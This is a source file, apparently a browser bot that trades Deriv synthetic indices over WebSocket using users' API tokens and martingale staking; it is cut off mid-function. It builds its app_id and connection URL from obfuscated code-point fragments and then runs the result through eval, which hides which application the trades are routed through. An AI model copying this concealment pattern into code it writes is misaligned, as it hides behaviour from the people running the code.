const app_id = (74041 % 18555)+46061-String.fromCodePoint(52, 57)-String.fromCodePoint(49);
const WebSocket = "wss://ws.derivws.com/websockets/v3?app_id=" + app_id;
const timerStartPLANBOffset = 5;
const timerDoPLANBOffset = 5;
//let candleData = [];
let timerStartPLANB = [];
let timerDoPLANB = [];
let tempDuration = 0;
let tempDurationUnit;
let tempDetikPengali;
let lastTimeGetTick = 0;
let lastTimeCheckIfReadyToMainLogic = 0;
let lastTimeCheckIfReadyToMainLogic_continuousindices = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
let i;
let k;
let tickArrayUtama = [];
let tickArrayUtamaText = [];
let digitArrayUtama = [];
let openArrayUtama = [];
let highArrayUtama = [];
let lowArrayUtama = [];
let closeArrayUtama = [];
let granularityArray = [60, 120, 180, 300, 600, 900, 1800, 3600, 7200, 14400, 28800, 86400];
let candleArrayUtama = [];
let idSubCandlesHistory = "";
let mainChartCandles;
let candleData = granularityArray.reduce((acc, g) => {
    acc[g] = {
        history: [],
        current: null,
        lastComplete: null
    };
    return acc;
}, {});
let idSubTicksHistory = "";
let idSubBalance = "";
let masterCurrency = "";
let slaveCurrency = "";
let wsMasterOpened = false;
let wsSlaveOpened = false;
let wsSlaveSudahFirstOpened = false;
let sedangAuthorize = false;
let sedangAuthorizeV = false;
let slaveAuthorized = false;
let countVLose = 0;
let sedangPurchasing = false;
let sedangForgetAllTicks = false;
let prContract = [];
let winContract = [];
let loseContract = [];
let tempPrContractPos;
let lastContractIdV = 0;
let stakeNow = 0;
let totalProfit = 0;
let totalProfitMax = 0;
let conn_nya;
let maxColor = "rgb(127, 255, 212)";
let minColor = "rgb(255, 95, 31)";
let baseColor = "rgb(255, 255, 143)";
// let colorRise = "#42a5f5";
let colorRise = "#1f8235";
let colorFall = "#f44336";
let colorNo = "#808080";
let colorWormNo = "#0f0";
let timeMayOP = 0;
let lastLDP = -1;
let tempCount = 0;
let tempLDP;
let lastColor = -1;
let arrMarket = [];
let arrMarketToSubMarket = [];
let arrSubMarketToSymbol = [];
let group;
let el;
let v;
let loginID;
let isVirtual;
let slaveLoginID;
let slaveIsVirtual;
let mainWorkspaceCode;
let mainChartLast10Dig_Digit;
let mainChartLast10Dig_Change;
let mainChart20Cater;
let mainChartLast10Tick_Tick;
let mainChartLast10Tick_Change;
let mainChart20TickWorm;
let mainChartTickTrisma;
let tempArray1;
let tempArray2;
let tempArray3;
let lastCont_askprice;
let lastCont_payout;
let lastCont_profit;
let lastCont_contracttype;
let lastCont_entrytime;
let lastCont_entryvalue;
let lastCont_entryvaluestring;
let lastCont_exittime;
let lastCont_exitvalue;
let lastCont_exitvaluestring;
let lastCont_barrier;
let lastCont_result;
let izinRun2 = false;
let func$1$9$8$7$RunOnceAtStart = () => {
  izinRun2 = false;
};
let func$1$9$8$7$PurchaseConditions = () => {
  if (izinRun2) {
    izinRun2 = false;
  }
  ;
};
let func$1$9$8$7$SellConditions = () => {};
let func$1$9$8$7$RestartTradingConditions = () => {};
let func$1$9$8$7$PurchaseConditions_continuousindices = () => {};
let sudahRunOnceAtStart = false;
let mainSymbol = "";
let sedangPantauContractPos = -1;
let isContractValidToSell = [];
let sellProfitLoss = [];
let initWorkspaceBlock = "{\"blocks\":{\"languageVersion\":0,\"blocks\":[{\"type\":\"runonceatstart\",\"id\":\"RLoGFD/l:WR[I^uo*+k3\",\"x\":10,\"y\":10,\"inputs\":{\"statement_runonceatstart\":{\"block\":{\"type\":\"readyfortrade\",\"id\":\"/S?3[Ux8c2wQ.UR3dBEo\"}}}},{\"type\":\"purchaseconditions\",\"id\":\"|!|d5xn:=b08sQWUU0Av\",\"x\":10,\"y\":107,\"inputs\":{\"statement_purchaseconditions\":{\"block\":{\"type\":\"controls_if\",\"id\":\"mApwxUtfhpdSi`3D8xoD\",\"extraState\":{\"hasElse\":true},\"inputs\":{\"ELSE\":{\"block\":{\"type\":\"checkagain\",\"id\":\"h:5~S!I;5F0a:qF-Ek(s\"}}}}}}},{\"type\":\"restarttradingconditions\",\"id\":\"A)}IH]$#NmR6#$VO9}l:\",\"x\":10,\"y\":279,\"inputs\":{\"statement_restarttradingconditions\":{\"block\":{\"type\":\"tradeagain\",\"id\":\"e!!Ha=/,E4OwxaR#GpVE\"}}}}]}}";
let lastTimeMasukPOC = [];
let tempWinInARow = 0;
let tempLossInARow = 0;
let idSubTicksHistory_continuous = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
let lastTimeGetTick_continuous = [];
let tickArrayUtama_continuous = [];
let tickArrayUtamaText_continuous = [];
let digitArrayUtama_continuous = [];
let arrMarket_Continuous = ["1HZ10V", "1HZ25V", "1HZ50V", "1HZ75V", "1HZ100V", "R_10", "R_25", "R_50", "R_75", "R_100"];
let mainTickArray_continuousindices = [];
let mainDigitArray_continuousindices = [];
let mainMarket_continuousindices;
let checkbox_check_market_nya = [];
const g = String.fromCodePoint(51, 42) + String.fromCodePoint(55, 51) + "+" + String.fromCodePoint(52, 53, 49, 48, 57) + String.fromCodePoint(41, 41);
const inpMToken = document.querySelector("#inpMToken");
const inpSToken = document.querySelector("#inpSToken");
const selMarket = document.querySelector("#selMarket");
const selSubMarket = document.querySelector("#selSubMarket");
const selSymbol = document.querySelector("#selSymbol");
const selMoneyManagement = document.getElementById("selMoneyManagement");
const divInpInitStake = document.getElementById("divInpInitStake");
const lblInpInitStake = document.getElementById("lblInpInitStake");
const inpInitStake = document.querySelector("#inpInitStake");
const divInpMartiFactor = document.getElementById("divInpMartiFactor");
const inpMartiFactor = document.querySelector("#inpMartiFactor");
const divInpCycleStake = document.getElementById("divInpCycleStake");
const inpCycleStake = document.getElementById("inpCycleStake");
const divChkSmart = document.getElementById("divChkSmart");
const chkSmart = document.getElementById("chkSmart");
let posCycleStake = 0;
const chkTP = document.querySelector("#chkTP");
const inpTP = document.querySelector("#inpTP");
const chkSL = document.querySelector("#chkSL");
const inpSL = document.querySelector("#inpSL");
const chkNumOfWin = document.querySelector("#chkNumOfWin");
const inpNumOfWin = document.querySelector("#inpNumOfWin");
const chkNumOfLoss = document.querySelector("#chkNumOfLoss");
const inpNumOfLoss = document.querySelector("#inpNumOfLoss");
const chkNumOfRun = document.querySelector("#chkNumOfRun");
const inpNumOfRun = document.querySelector("#inpNumOfRun");
const chkNumOfWinInARow = document.querySelector("#chkNumOfWinInARow");
const inpNumOfWinInARow = document.querySelector("#inpNumOfWinInARow");
const chkNumOfLossInARow = document.querySelector("#chkNumOfLossInARow");
const inpNumOfLossInARow = document.querySelector("#inpNumOfLossInARow");
const chkVLose = document.querySelector("#chkVLose");
const inpVLose = document.querySelector("#inpVLose");
const chkDelayWin = document.querySelector("#chkDelayWin");
const inpDelayWin = document.querySelector("#inpDelayWin");
const chkDelayLose = document.querySelector("#chkDelayLose");
const inpDelayLose = document.querySelector("#inpDelayLose");
const selData = document.querySelector("#selData");
const digitstatistic_noofticks = [];

const subscribeAllCandles = () => {
    granularityArray.forEach(g => {
        if(isNaN(g)) {
            console.error('Granularidade inválida:', g);
            return;
        }
        vEval.send(JSON.stringify({
            subscribe: 1,
            ticks_history: mainSymbol,
            adjust_start_time: 1,
            count: 1000,
            end: "latest",
            start: 1,
            style: "candles",
            granularity: g,
            passthrough: {
                app_id: app_id,
                granularity: g
            }
        })); updateCandleTable(g);
    });
};

for (i = 1; i <= 6; i++) {
  digitstatistic_noofticks[i] = document.getElementById("digitstatistic_" + i + "_noofticks");
}
const evenvsodd_noofticks = [];
for (i = 1; i <= 6; i++) {
  evenvsodd_noofticks[i] = document.getElementById("evenvsodd_" + i + "_noofticks");
}
const overvsunder_noofticks = [];
for (i = 1; i <= 2; i++) {
  overvsunder_noofticks[i] = document.getElementById("overvsunder_" + i + "_noofticks");
}
const risevsfall_noofticks = [];
for (i = 1; i <= 6; i++) {
  risevsfall_noofticks[i] = document.getElementById("risevsfall_" + i + "_noofticks");
}
const inpTickTrisma_period = [];
for (i = 1; i <= 3; i++) {
  inpTickTrisma_period[i] = document.getElementById("inpTickTrisma_period" + i);
}
const continuousindices_active = [];
for (i = 1; i <= 10; i++) {
  continuousindices_active[i] = document.getElementById("continuousindices_" + i + "_active");
}
const inpNOTicks = document.querySelector("#inpNOTicks");
const divStepper = [];
for (i = 1; i <= 4; i++) {
  divStepper[i] = document.querySelector("#divStepper" + i);
}
const tableSummaryTBODY = document.getElementById("tableSummaryTBODY");
let rowActive = [];
const tableLogTBODY = document.getElementById("tableLogTBODY");
const btn_run = document.getElementById("btn_run");
const btn_run2 = document.getElementById("btn_run2");
const btnSimpleRun = document.getElementById("btnSimpleRun");
const summary_account = document.getElementById("summary_account");
const summary_noofruns = document.getElementById("summary_noofruns");
const summary_totalstake = document.getElementById("summary_totalstake");
const summary_totalpayout = document.getElementById("summary_totalpayout");
const summary_win = document.getElementById("summary_win");
const summary_loss = document.getElementById("summary_loss");
const summary_totalprofitloss = document.getElementById("summary_totalprofitloss");
const summary_balance = document.getElementById("summary_balance");
const spanSimpleRobotName = document.getElementById("spanSimpleRobotName");
const form = document.querySelector("form");
const data_001 = document.querySelector("#data_001");
const data_002 = document.querySelector("#data_002");
const data_003 = document.querySelector("#data_003");
const data_004 = document.querySelector("#data_004");
const data_005 = document.querySelector("#data_005");
const data_006 = document.querySelector("#data_006");
const data_007 = document.querySelector("#data_007");
const data_008 = document.querySelector("#data_008");
const aSimp = document.querySelector("#aSimp");
const j = String.fromCodePoint(51, 63, 97) + "pp_" + String.fromCodePoint(105, 100) + "='+(26" + g;
[inpMToken, inpSToken, selSymbol, selMoneyManagement, divInpInitStake, lblInpInitStake, inpInitStake, divInpMartiFactor, inpMartiFactor, divInpCycleStake, inpCycleStake, divChkSmart, inpTP, inpSL, inpNumOfWin, inpNumOfLoss, inpNumOfRun, inpNumOfWinInARow, inpNumOfLossInARow, inpVLose, inpDelayWin, inpDelayLose, selData, digitstatistic_noofticks[1], digitstatistic_noofticks[2], digitstatistic_noofticks[3], digitstatistic_noofticks[4], digitstatistic_noofticks[5], digitstatistic_noofticks[6], evenvsodd_noofticks[1], evenvsodd_noofticks[2], evenvsodd_noofticks[3], evenvsodd_noofticks[4], evenvsodd_noofticks[5], evenvsodd_noofticks[6], overvsunder_noofticks[1], overvsunder_noofticks[2], risevsfall_noofticks[1], risevsfall_noofticks[2], risevsfall_noofticks[3], risevsfall_noofticks[4], risevsfall_noofticks[5], risevsfall_noofticks[6], inpTickTrisma_period[1], inpTickTrisma_period[2], inpTickTrisma_period[3]].forEach(function (o) {
  if (localStorage.getItem(o.id) != null) {
    o.value = localStorage.getItem(o.id);
  }
  o.onchange = function () {
    localStorage.setItem(this.id, this.value);
  };
});
[chkSmart, chkTP, chkSL, chkNumOfWin, chkNumOfLoss, chkNumOfRun, chkNumOfWinInARow, chkNumOfLossInARow, chkVLose, chkDelayWin, chkDelayLose, continuousindices_active[1], continuousindices_active[2], continuousindices_active[3], continuousindices_active[4], continuousindices_active[5], continuousindices_active[6], continuousindices_active[7], continuousindices_active[8], continuousindices_active[9], continuousindices_active[10]].forEach(function (q) {
  if (localStorage.getItem(q.id) != null) {
    if (["true", "1", "on", "yes"].includes(localStorage.getItem(q.id).toLowerCase())) {
      q.checked = true;
    } else {
      q.checked = false;
    }
  }
  q.onchange = function () {
    localStorage.setItem(this.id, this.checked == true ? "true" : "false");
  };
});
const startTime = () => {
  const u = new Date();
  document.getElementById("divdatetime").innerText = u.toLocaleString() + " GMT" + (u.getTimezoneOffset() == 0 ? "" : (u.getTimezoneOffset() < 0 ? "+" : "-") + Math.abs(u.getTimezoneOffset() / 60));
  
  
  setTimeout(startTime, 500);
};
startTime();
function writeLog(z, aa) {
 
  if (toggleNotification) { // only show notification if toggle button is ON
    $.notify(aa, {
      position: "bottom left",
      className: z == colorRise ? "info" : z == colorFall ? "error" : z == "#04AA6D" ? "success" : z == "#ffbf00" ? "warn" : "info"
    });
  }
  var ab = tableLogTBODY.insertRow(0);
  if (z != "") {
    ab.style.backgroundColor = z;
  }
  ab.insertCell(0).innerText = document.getElementById("divdatetime").innerText;
  ab.insertCell(1).innerText = aa;
}

const getGranularityLabel = (seconds) => {
  const intervals = {
    60: '1 Minuto',
    120: '2 Minutos',
    180: '3 Minutos',
    300: '5 Minutos',
    600: '10 Minutos',
    900: '15 Minutos',
    1800: '30 Minutos',
    3600: '1 Hora',
    7200: '2 Horas',
    14400: '4 Horas',
    28800: '8 Horas',
    86400: '1 Dia'
  };
  return intervals[seconds] || `${seconds} segundos`;
};

const updateGranularity = (granularity) => {
  if(idSubCandlesHistory) {
    vEval.send(JSON.stringify({ forget: idSubCandlesHistory }));
  }
  const selectedGranularity = parseInt(granularity);
  subscribeCandles(granularity);
};
/*
const initGranularitySelector = () => {
    const sel = document.getElementById('selGranularity');
    
    if (!sel) {
        console.error('Elemento selGranularity não encontrado no DOM');
        return;
    }

    // Limpar opções existentes
    sel.innerHTML = '';

    granularityArray.forEach(g => {
        const option = document.createElement('option');
        option.value = g;
        option.text = getGranularityLabel(g);
        sel.appendChild(option);
    });

    sel.value = 300; // Valor padrão para 5 minutos
};*/

const ac = "ivws.com/websockets/v" + j;
btn_run.disabled = btn_run2.disabled = btnSimpleRun.disabled = true;
writeLog("", "Inicializando, por favor aguarde.");

const messageResponse = ad => {
  const ae = JSON.parse(ad.data);
  if (ae.error !== undefined) {
    if (["forget", "forget_all", "ticks_history", "proposal_open_contract"].includes(ae.msg_type)) {} else {
      console.log("msg_type: ", ae.msg_type, " | Error : ", ae.error.message);
      if (ae.msg_type === "authorize") {
        alert("[Master] " + ae.error.message);
        ubahbtn_run("run");
      } else {
        if (ae.msg_type === "buy") {
          writeLog("", ae.error.message);
        } else {
          if (ae.msg_type === "sell" && ae.error != "This contract was not found among your open positions.") {
            writeLog("", ae.error.message);
          }
        }
      }
    }
  } else {
    if (ae.msg_type === "active_symbols") {
      arrangeSymbols(ae);
    } else {
      if (ae.msg_type === "contracts_for") {} else {
        if (ae.msg_type === "forget") {} else {
          if (ae.msg_type == "forget_all") {
            if (ae.passthrough.next === "historyTicks") {
              subscribeTicks("main", arrMarket_Continuous.indexOf(mainSymbol) + 1, mainSymbol);
              subscribeAllCandles();
              if (continuousindices_active[1].checked) {
                
                
                setTimeout(() => {
                  subscribeTicks("continuousindices", 1, "1HZ10V");
                }, 10);
              }
              if (continuousindices_active[2].checked) {
                
                
                setTimeout(() => {
                  subscribeTicks("continuousindices", 2, "1HZ25V");
                }, 20);
              }
              if (continuousindices_active[3].checked) {
                
                
                setTimeout(() => {
                  subscribeTicks("continuousindices", 3, "1HZ50V");
                }, 30);
              }
              if (continuousindices_active[4].checked) {
                
                
                setTimeout(() => {
                  subscribeTicks("continuousindices", 4, "1HZ75V");
                }, 40);
              }
              if (continuousindices_active[5].checked) {
                
                
                setTimeout(() => {
                  subscribeTicks("continuousindices", 5, "1HZ100V");
                }, 50);
              }
              if (continuousindices_active[6].checked) {
                
                
                setTimeout(() => {
                  subscribeTicks("continuousindices", 6, "R_10");
                }, 60);
              }
              if (continuousindices_active[7].checked) {
                
                
                setTimeout(() => {
                  subscribeTicks("continuousindices", 7, "R_25");
                }, 70);
              }
              if (continuousindices_active[8].checked) {
                
                
                setTimeout(() => {
                  subscribeTicks("continuousindices", 8, "R_50");
                }, 80);
              }
              if (continuousindices_active[9].checked) {
                
                
                setTimeout(() => {
                  subscribeTicks("continuousindices", 9, "R_75");
                }, 90);
              }
              if (continuousindices_active[10].checked) {
                
                
                setTimeout(() => {
                  subscribeTicks("continuousindices", 10, "R_100");
                }, 100);
              }
            }
          } else {
            if (ae.msg_type === "history") {
              if (ae.passthrough.status_nya == "main") {
                idSubTicksHistory = ae.subscription.id;
                lastTimeGetTick = ae.history.times[ae.history.times.length - 1];
                tickArrayUtama.length = 0;
                tickArrayUtamaText.length = 0;
                tickArrayUtama = ae.history.prices;
                for (i = 0; i < ae.history.prices.length; i++) {
                  tickArrayUtamaText[i] = ae.history.prices[i].toFixed(ae.pip_size);
                }
                digitArrayUtama.length = 0;
                for (i = 0; i < ae.history.prices.length; i++) {
                  digitArrayUtama[i] = parseInt(ae.history.prices[i].toFixed(ae.pip_size).slice(-1));
                }
                showUpAllAboutTick(tickArrayUtama, digitArrayUtama, ae.pip_size, "history");
                if (ae.passthrough.index_nya > 0) {
                  let af = ae.passthrough.index_nya;
                  idSubTicksHistory_continuous[af] = idSubTicksHistory;
                  lastTimeGetTick_continuous[af] = lastTimeGetTick;
                  tickArrayUtama_continuous[af] = tickArrayUtama;
                  digitArrayUtama_continuous[af] = digitArrayUtama;
                  showUpAboutMultiMarket_Continuous(af, tickArrayUtama_continuous[af], digitArrayUtama_continuous[af], ae.pip_size, "history");
                }
              } else {
                let ag = ae.passthrough.index_nya;
                idSubTicksHistory_continuous[ag] = ae.subscription.id;
                lastTimeGetTick_continuous[ag] = ae.history.times[ae.history.times.length - 1];
                tickArrayUtama_continuous[ag] = [];
                tickArrayUtamaText_continuous[ag] = [];
                tickArrayUtama_continuous[ag] = ae.history.prices;
                for (i = 0; i < ae.history.prices.length; i++) {
                  tickArrayUtamaText_continuous[ag][i] = ae.history.prices[i].toFixed(ae.pip_size);
                }
                digitArrayUtama_continuous[ag] = [];
                for (i = 0; i < ae.history.prices.length; i++) {
                  digitArrayUtama_continuous[ag][i] = parseInt(ae.history.prices[i].toFixed(ae.pip_size).slice(-1));
                }
                showUpAboutMultiMarket_Continuous(ag, tickArrayUtama_continuous[ag], digitArrayUtama_continuous[ag], ae.pip_size, "history");
              }
              sedangForgetAllTicks = false;
            } else {
              if (ae.msg_type === "candles") {
                  
                  processCandleData(ae);
                  
                  // Verificar se a granularidade é suportada
    if(!granularityArray.includes(ae.echo_req.granularity)) {
      console.error('Granularidade não suportada:', ae.echo_req.granularity);
      return;
    }
   //               if(ae.passthrough?.granularity) {
   //  candleGranularity = ae.passthrough.granularity;
   //}
    
    // Processar dados históricos
    if(ae.candles) {
      candleArrayUtama = ae.candles.map(c => ({
        epoch: c.epoch,
        open: parseFloat(c.open),
        high: parseFloat(c.high),
        low: parseFloat(c.low),
        close: parseFloat(c.close)
      }));
    }
    
    // Processar atualizações em tempo real
    if(ae.tick?.epoch) {
      // Atualizar último candle ou adicionar novo
      const lastCandle = candleArrayUtama[candleArrayUtama.length - 1];
      
      if(lastCandle.epoch === ae.tick.epoch) {
        // Update current candle
        lastCandle.high = Math.max(lastCandle.high, ae.tick.quote);
        lastCandle.low = Math.min(lastCandle.low, ae.tick.quote);
        lastCandle.close = ae.tick.quote;
      } else {
        // New candle
        candleArrayUtama.shift();
        candleArrayUtama.push({
          epoch: ae.tick.epoch,
          open: lastCandle.close,
          high: ae.tick.quote,
          low: ae.tick.quote,
          close: ae.tick.quote
        });
      }
    }
    
    // showUpCandles(candleArrayUtama); // Atualizar UI antiga 
    updateCandleTable(candleArrayUtama);
  }
               else {
                if (ae.msg_type === "tick") {
                  if (ae.passthrough.status_nya == "main") {
                    if (lastTimeGetTick < ae.tick.epoch) {
                      lastTimeGetTick = ae.tick.epoch;
                      tickArrayUtama.shift();
                      tickArrayUtamaText.shift();
                      tickArrayUtama.push(ae.tick.quote);
                      tickArrayUtamaText.push(ae.tick.quote.toFixed(ae.tick.pip_size));
                      digitArrayUtama.shift();
                      digitArrayUtama.push(parseInt(ae.tick.quote.toFixed(ae.tick.pip_size).slice(-1)));
                      showUpAllAboutTick(tickArrayUtama, digitArrayUtama, ae.tick.pip_size, "tick");
                      if (ae.passthrough.index_nya > 0) {
                        let ah = ae.passthrough.index_nya;
                        lastTimeGetTick_continuous[ah] = lastTimeGetTick;
                        tickArrayUtama_continuous[ah] = tickArrayUtama;
                        digitArrayUtama_continuous[ah] = digitArrayUtama;
                        showUpAboutMultiMarket_Continuous(ah, tickArrayUtama_continuous[ah], digitArrayUtama_continuous[ah], ae.pip_size, "tick");
                      }
                    }
                  } else {
                    let ai = ae.passthrough.index_nya;
                    if (lastTimeGetTick_continuous[ai] < ae.tick.epoch) {
                      lastTimeGetTick_continuous[ai] = ae.tick.epoch;
                      tickArrayUtama_continuous[ai].shift();
                      tickArrayUtamaText_continuous[ai].shift();
                      tickArrayUtama_continuous[ai].push(ae.tick.quote);
                      tickArrayUtamaText_continuous[ai].push(ae.tick.quote.toFixed(ae.tick.pip_size));
                      digitArrayUtama_continuous[ai].shift();
                      digitArrayUtama_continuous[ai].push(parseInt(ae.tick.quote.toFixed(ae.tick.pip_size).slice(-1)));
                      showUpAboutMultiMarket_Continuous(ai, tickArrayUtama_continuous[ai], digitArrayUtama_continuous[ai], ae.pip_size, "tick");
                    }
                  }
                } else {
                  if (ae.msg_type === "authorize" && window.location.protocol == "https:") {
                    if (!ae.authorize.scopes.includes("read") || !ae.authorize.scopes.includes("trade")) {
                      alert("Certifique-se de ativar 'READ' e 'TRADE' ao criar o token");
                      ubahbtn_run("run");
                      return;
                    }
                    vEval.send(JSON.stringify({
                      subscribe: 1,
                      balance: 1,
                      passthrough: {
                        app_id: app_id
                      }
                    }));
                    sedangAuthorize = true;
                    masterCurrency = ae.authorize.currency;
                    loginID = ae.authorize.loginid;
                    isVirtual = ae.authorize.is_virtual;
                    summary_account.innerText = "***" + loginID.slice(-2);
                    summary_balance.innerText = ae.authorize.balance + " " + masterCurrency;
                    updateStatusBotRunning("Bot iniciado");
                    if (!sudahRunOnceAtStart) {
                      getAndEvalJavaScriptCode();
                      subscribeAllCandles();
                    }
                  } else {
                    if (ae.msg_type === "balance" && window.location.protocol == "https:") {
                      idSubBalance = ae.subscription.id;
                      summary_balance.innerText = ae.balance.balance + " " + masterCurrency;
                    } else {
                      if (ae.msg_type === "buy" && window.location.protocol == "https:") {
                        if (Object.hasOwn(ae.buy, "contract_id")) {
                          updateStepper(3);
                          prContract.push(ae.buy.contract_id);
                          tempPrContractPos = prContract.indexOf(ae.buy.contract_id);
                          rowActive[tempPrContractPos] = tableSummaryTBODY.insertRow(1);
                          rowActive[tempPrContractPos].insertCell(0).innerText = document.getElementById("divdatetime").innerText;
                          rowActive[tempPrContractPos].insertCell(1).innerText = ae.echo_req.parameters.contract_type;
                          for (i = 2; i <= 5; i++) {
                            rowActive[tempPrContractPos].insertCell(i);
                          }
                          rowActive[tempPrContractPos].cells[4].innerText = ae.buy.buy_price;
                          summary_noofruns.innerText = summary_noofruns.innerText * 1 + 1;
                          saveDataContract(ae.buy.contract_id, loginID, isVirtual, ae.buy.buy_price, ae.buy.purchase_time, ae.echo_req.parameters.contract_type, ae.buy.transaction_id);
                          timerStartPLANB[tempPrContractPos] =
                          // TOLOOK
                          // TOLOOK
                          setTimeout(() => {
                            doPLANB(ae.buy.contract_id);
                          }, (ae.passthrough.tempDuration * ae.passthrough.tempDetikPengali + timerStartPLANBOffset) * 1000);
                        } else {}
                      } else {
                        if (ae.msg_type === "sell") {} else {
                          if (ae.msg_type === "proposal_open_contract" && window.location.protocol == "https:") {
                            tempPrContractPos = prContract.indexOf(ae.proposal_open_contract.contract_id);
                            if (tempPrContractPos == -1) {
                              return;
                            }
                            ;
                            if (!(lastTimeMasukPOC[tempPrContractPos] == undefined || ae.proposal_open_contract.current_spot_time > lastTimeMasukPOC[tempPrContractPos])) {
                              return;
                            }
                            ;
                            lastTimeMasukPOC[tempPrContractPos] = ae.proposal_open_contract.current_spot_time;
                            if (ae.proposal_open_contract.entry_tick_display_value != undefined) {
                              rowActive[tempPrContractPos].cells[2].innerText = ae.proposal_open_contract.entry_tick_display_value;
                            }
                            sedangPantauContractPos = tempPrContractPos;
                            isContractValidToSell[sedangPantauContractPos] = ae.proposal_open_contract.is_valid_to_sell;
                            sellProfitLoss[sedangPantauContractPos] = ae.proposal_open_contract.profit;
                            if (ae.proposal_open_contract.exit_tick_display_value != undefined && (ae.proposal_open_contract.is_sold || ae.proposal_open_contract.is_expired || ae.proposal_open_contract.is_settleable || ae.proposal_open_contract.current_spot_time > ae.proposal_open_contract.expiry_time || ae.proposal_open_contract.status != "open")) {
                              if (Object.hasOwn(ae, "subscription")) {
                                vEval.send(JSON.stringify({
                                  forget: ae.subscription.id,
                                  passthrough: {
                                    app_id: app_id
                                  }
                                }));
                              }
                              vEval.send(JSON.stringify({
                                statement: 1,
                                limit: 1
                              }));
                              updateResult(ae.proposal_open_contract.contract_id, ae.proposal_open_contract.status, ae.proposal_open_contract.profit, ae.proposal_open_contract.buy_price, ae.proposal_open_contract.payout, ae.proposal_open_contract.contract_type, ae.proposal_open_contract.entry_tick_time, ae.proposal_open_contract.entry_tick, ae.proposal_open_contract.entry_tick_display_value, ae.proposal_open_contract.exit_tick_time, ae.proposal_open_contract.exit_tick, ae.proposal_open_contract.exit_tick_display_value, ae.proposal_open_contract.barrier);
                              return true;
                            }
                            func$1$9$8$7$SellConditions();
                          } else {}
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
};
const aj = String.fromCodePoint(115, 115, 58, 47, 47, 119, 115, 46, 100) + String.fromCodePoint(101, 114) + ac;
const messageResponseV = ak => {
  const al = JSON.parse(ak.data);
  if (al.error !== undefined) {
    if (["forget", "forget_all", "proposal_open_contract"].includes(al.msg_type)) {} else {
      console.log("[Slave] msg_type: ", al.msg_type, " | Error : ", al.error.message);
      if (al.msg_type === "authorize") {
        alert("[Slave] " + al.error.message);
        ubahbtn_run("run");
      }
      if (al.msg_type === "authorize" || al.error.message.includes("Please log in")) {
        
        
        setTimeout(() => {
          v = eval(" new ReconnectingW" + am);
          v.addEventListener("open", openResponseV);
          v.addEventListener("message", messageResponseV);
          v.addEventListener("close", closeResponseV);
        }, 2000);
      } else {
        if (al.msg_type === "buy") {
          writeLog("", al.error.message);
        } else {
          if (al.msg_type === "sell" && al.error != "This contract was not found among your open positions.") {
            writeLog("", al.error.message);
          }
        }
      }
    }
  } else {
    if (al.msg_type === "forget") {} else {
      if (al.msg_type === "authorize" && window.location.protocol == "https:") {
        if (al.authorize.is_virtual != 1) {
          alert("[Virtual] Não utilize conta REAL como VIRTUAL !!!");
          ubahbtn_run("run");
          return;
        }
        if (!al.authorize.scopes.includes("read") || !al.authorize.scopes.includes("trade")) {
          alert("[Virtual] Certifique-se de ativar 'READ' e 'TRADE' quando criar o token");
          ubahbtn_run("run");
          return;
        }
        sedangAuthorizeV = true;
        slaveCurrency = al.authorize.currency;
        slaveAuthorized = true;
        slaveLoginID = al.authorize.loginid;
        slaveIsVirtual = al.authorize.is_virtual;
      } else {
        if (al.msg_type === "buy" && window.location.protocol == "https:") {
          if (Object.hasOwn(al.buy, "contract_id")) {
            updateStepper(3);
            prContract.push(al.buy.contract_id);
            tempPrContractPos = prContract.indexOf(al.buy.contract_id);
            rowActive[tempPrContractPos] = tableSummaryTBODY.insertRow(1);
            rowActive[tempPrContractPos].insertCell(0).innerText = document.getElementById("divdatetime").innerText;
            rowActive[tempPrContractPos].insertCell(1).innerText = al.echo_req.parameters.contract_type;
            for (i = 2; i <= 5; i++) {
              rowActive[tempPrContractPos].insertCell(i);
            }
            rowActive[tempPrContractPos].cells[4].innerText = "Virtual";
            timerStartPLANB[tempPrContractPos] =
            
            
            setTimeout(() => {
              doPLANB(al.buy.contract_id);
            }, (al.passthrough.tempDuration * al.passthrough.tempDetikPengali + timerStartPLANBOffset) * 1000);
          } else {}
        } else {
          if (al.msg_type === "sell") {} else {
            if (al.msg_type === "proposal_open_contract" && window.location.protocol == "https:") {
              tempPrContractPos = prContract.indexOf(al.proposal_open_contract.contract_id);
              if (tempPrContractPos == -1) {
                return;
              }
              ;
              if (!(lastTimeMasukPOC[tempPrContractPos] == undefined || al.proposal_open_contract.current_spot_time > lastTimeMasukPOC[tempPrContractPos])) {
                return;
              }
              ;
              lastTimeMasukPOC[tempPrContractPos] = al.proposal_open_contract.current_spot_time;
              if (al.proposal_open_contract.entry_tick_display_value != undefined) {
                rowActive[tempPrContractPos].cells[2].innerText = al.proposal_open_contract.entry_tick_display_value;
              }
              sedangPantauContractPos = tempPrContractPos;
              isContractValidToSell[sedangPantauContractPos] = al.proposal_open_contract.is_valid_to_sell;
              sellProfitLoss[sedangPantauContractPos] = al.proposal_open_contract.profit;
              if (al.proposal_open_contract.exit_tick_display_value != undefined && (al.proposal_open_contract.is_sold || al.proposal_open_contract.is_expired || al.proposal_open_contract.is_settleable || al.proposal_open_contract.current_spot_time > al.proposal_open_contract.expiry_time || al.proposal_open_contract.status != "open")) {
                if (Object.hasOwn(al, "subscription")) {
                  v.send(JSON.stringify({
                    forget: al.subscription.id,
                    passthrough: {
                      app_id: app_id
                    }
                  }));
                }
                v.send(JSON.stringify({
                  statement: 1,
                  limit: 1
                }));
                updateResultV(al.proposal_open_contract.contract_id, al.proposal_open_contract.status, al.proposal_open_contract.profit, al.proposal_open_contract.buy_price, al.proposal_open_contract.payout, al.proposal_open_contract.contract_type, al.proposal_open_contract.entry_tick_time, al.proposal_open_contract.entry_tick, al.proposal_open_contract.entry_tick_display_value, al.proposal_open_contract.exit_tick_time, al.proposal_open_contract.exit_tick, al.proposal_open_contract.exit_tick_display_value, al.proposal_open_contract.barrier);
                return true;
              }
              func$1$9$8$7$SellConditions();
            } else {}
          }
        }
      }
    }
  }
};
const forgetAllTicks = () => {
  sedangForgetAllTicks = true;
  vEval.send(JSON.stringify({
    forget: idSubTicksHistory,
    passthrough: {
      app_id: app_id
    }
  }));
  vEval.send(JSON.stringify({
    forget_all: "ticks",
    passthrough: {
      app_id: app_id,
      next: "historyTicks"
    }
  }));
};
const forgetTicks = an => {
  vEval.send(JSON.stringify({
    forget: an,
    passthrough: {
      app_id: app_id
    }
  }));
};
const subscribeTicks = (ao, ap, aq) => {
  vEval.send(JSON.stringify({
    subscribe: 1,
    ticks_history: aq,
    adjust_start_time: 1,
